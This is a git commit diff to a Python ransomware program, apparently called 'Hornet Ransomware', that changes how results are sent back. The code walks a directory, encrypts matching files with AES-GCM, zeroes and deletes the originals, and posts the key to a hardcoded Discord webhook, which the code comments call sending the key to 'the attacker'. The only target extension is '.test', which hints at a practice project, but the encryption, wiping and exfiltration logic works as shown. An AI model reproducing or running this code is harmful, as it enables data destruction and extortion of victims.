1e4012dd4c0392486d5daf61910aeedc8e785a78
knightchaser <agerio100@naver.com>
2024-12-06 23:47:21 +0900

    Data is sent to the Discord with better visibility and programming convenience

--- main.py
+++ main.py
@@ -1,17 +1,18 @@
 # main.py
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite
 
-from typing import List
+from typing import List, Dict, Union, Any
 from rich.console import Console
 from exceptions import HornetRansomwareException
 import requests
 import secrets
 import os
+import json
 
 # For rich and detailed error or information messages
 console = Console()
 
-def send_data(data: str) -> bool:
+def send_data(data: Union[Dict, str]) -> bool:
     """
     Send data to the server(Discord) and check if it succeeded.
 
@@ -19,6 +20,13 @@ def send_data(data: str) -> bool:
     :return: True if the data was sent successfully, False otherwise.
     """
     webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"
+
+    if isinstance(data, Dict):
+        # If the data is a Python dictionary, then stringify with 2 spaces per indentation
+        data = json.dumps(data, indent=4)
+
+    # Wrap by the code block (for better readability in Discord)
+    data = f"```json\n{data}\n```"
 
     payload = {
         "content": data
@@ -58,7 +66,7 @@ def encrypt_file(filepath: str, key: bytes) -> None:
         encrypted_filepath = f"{filepath}.enc"
         with open(encrypted_filepath, "wb") as file:
             file.write(nonce + ciphertext)
-        print(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
+        console.log(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
     except Exception as e:
         raise HornetRansomwareException(
                 message = f"An error occurred while encrypting {filepath}: {e}",
@@ -81,7 +89,7 @@ def wipe_file(filepath: str) -> None:
             file.write(b"\x00" * os.path.getsize(filepath))
             file.truncate()
         os.remove(filepath)
-        print(f"Successfully wiped {filepath}.")
+        console.log(f"Successfully wiped {filepath}.")
     except Exception as e:
         raise HornetRansomwareException(
             message = f"An error occurred while wiping {filepath}: {e}",
@@ -90,16 +98,21 @@ def wipe_file(filepath: str) -> None:
             }
         )
 
-def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> None:
+def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> int:
     """
     Recursively walk through a directory and encrypt all files in it.
+
     :param directory: The path to the directory to walk through.
     :param key: The key to use for encryption.
+
+    :return: The number of files encrypted.
     """
+    number_of_files_encrypted = 0
+
     # Directory must exist
     if not os.path.exists(directory):
-        print(f"Directory {directory} does not exist.")
-        return
+        console.log(f"Directory {directory} does not exist.")
+        return number_of_files_encrypted
 
     assert len(extensions) > 0, "At least one extension must be provided."
 
@@ -110,6 +123,7 @@ def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) ->
                 if filepath.endswith(tuple(extensions)):
                     encrypt_file(filepath, key) 
                     wipe_file(filepath)
+                    number_of_files_encrypted += 1
     except os.error as e:
         raise HornetRansomwareException(
                 message = f"An error occurred while walking through the directory: {e}",
@@ -127,6 +141,8 @@ def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) ->
                 }
         )
 
+    return number_of_files_encrypted
+
 def generate_key() -> bytes:
     """
     Generate a random 256-bit key for AES-GCM encryption.
@@ -142,11 +158,17 @@ if __name__ == "__main__":
     # Encrypt all files in the current directory with the given extensions
     directory = "."
     extension_list = [".test"]
-    encrypt_directory_walk(directory, key, extension_list)
+    number_of_files_encrypted = encrypt_directory_walk(directory, key, extension_list)
     
     # Send the key to the attacker in an hexadecimal format
     key_hex = key.hex()
-    if send_data(key_hex):
-        print("Key sent successfully.")
+    console.log(f"Key was generated: {key_hex[:10]}...")
+    data: Dict[str, Any] = {
+        "key": key_hex,
+        "number_of_files_encrypted": number_of_files_encrypted
+    }
+
+    if send_data(data):
+        console.log("Key sent successfully.")
     else:
-        print("Failed to send key.")
+        console.log("Failed to send key.")
